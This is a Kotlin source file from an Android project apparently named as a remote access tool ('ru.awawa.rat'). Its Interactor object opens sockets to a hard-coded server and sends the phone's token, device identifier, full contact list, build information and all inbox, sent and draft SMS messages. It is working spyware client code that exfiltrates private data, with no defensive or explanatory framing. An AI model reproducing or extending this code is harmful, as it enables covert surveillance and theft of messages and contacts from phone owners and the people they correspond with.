package ru.awawa.rat.server

import android.util.Log
import io.ktor.network.selector.*
import io.ktor.network.sockets.*
import io.ktor.utils.io.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import ru.awawa.rat.Application
import ru.awawa.rat.helper.BuildInfo
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.helper.SmsHelper
import java.io.*
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException
import java.util.logging.Logger

object Interactor {

    private const val TAG = "Interactor"
    private const val SERVER_IP = "10.0.2.2"
    private const val SERVER_PORT = 33455

    private const val dataDivider = ":|:"

    fun init() {
    }

    fun sendToken() {

        GlobalScope.launch(Dispatchers.IO) {

            val socket = Socket()
            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))

            val output = socket.getOutputStream()
            val input = socket.getInputStream().bufferedReader()

            val token = Preferences.get<String>(Preferences.PreferencesField.TOKEN) ?: ""
            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            val dataToSend = "connect${dataDivider}$uuid${dataDivider}$token\n".toByteArray()
            Log.d(TAG, "Sending $dataToSend")
            output.write(dataToSend)

            Log.d(TAG, "Waiting fo response")
            val result = input.readLine().split(dataDivider)

            if (result[0] == "ok") {
                val newUuid = result[1]
                Preferences.set(Preferences.PreferencesField.UUID, newUuid)
            } else {
                val errorMessage = result.getOrElse(1) { "" }
                Log.e(TAG, "Connect failed: $errorMessage")
            }
            Log.d(TAG, "Received $result")

            socket.close()
        }
    }

    fun sendContacts() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
            val contacts = ContactsHelper.getContacts(Application.context)
            socket.getOutputStream().write("contacts${dataDivider}$uuid${dataDivider}$contacts\n".toByteArray())
            Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")

            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
            Log.d(TAG, "Answer: $result")

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Contacts sending failed: $error")
            }

            socket.close()
        }
    }

    fun sendPhoneInfo() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
            val info = BuildInfo.getInfo()
            socket.getOutputStream().write("phone_info${dataDivider}$uuid${dataDivider}$info\n".toByteArray())

            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "Phone info sending failed: $error")
            }

            socket.close()
        }
    }

    fun sendSms() {
        GlobalScope.launch(Dispatchers.IO) {
            val socket = Socket()
            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))

            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            val inbox = SmsHelper.readMessages(Application.context, SmsHelper.INBOX).joinToString("\n") { it }
            socket.getOutputStream().write(
                "sms${dataDivider}$uuid${dataDivider}INBOX${dataDivider}$inbox\n".toByteArray()
            )

            val sent = SmsHelper.readMessages(Application.context, SmsHelper.SENT).joinToString("\n") { it }
            socket.getOutputStream().write(
                "sms${dataDivider}$uuid${dataDivider}SENT${dataDivider}$sent\n".toByteArray()
            )

            val draft = SmsHelper.readMessages(Application.context, SmsHelper.DRAFT).joinToString("\n") { it }
            socket.getOutputStream().write(
                "sms${dataDivider}$uuid${dataDivider}DRAFT${dataDivider}$draft\n".toByteArray()
            )

            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)

            if (result[0] != "ok") {
                val error = result.getOrElse(1) { "" }
                Log.e(TAG, "SMS sending failed: $error")
            }

            socket.close()
        }
    }
}